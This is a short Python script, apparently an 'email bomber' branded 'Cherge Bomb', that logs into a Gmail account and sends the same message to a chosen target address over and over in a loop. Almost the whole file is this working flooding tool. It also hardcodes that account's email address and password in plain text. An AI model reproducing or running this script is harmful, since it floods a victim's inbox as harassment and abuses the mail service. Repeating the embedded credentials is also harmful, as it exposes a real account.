import smtplib
import time




def amaliyat(bomb_email, message, counter):
    email = "chergebomb@gmail.com"
    password = "cherge-bomb8384"
  
    allmessage = f"""
    Cherge Bomb


    {message}


    You can do the same with cherge-bomb.tk
    
    """

    num = 0
    for x in range(counter):
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,allmessage.encode('utf-8'))
        num += 1
        print(f"message sent to {bomb_email}[{num}]")
        time.sleep(1)

    mail.close()

    print("Done")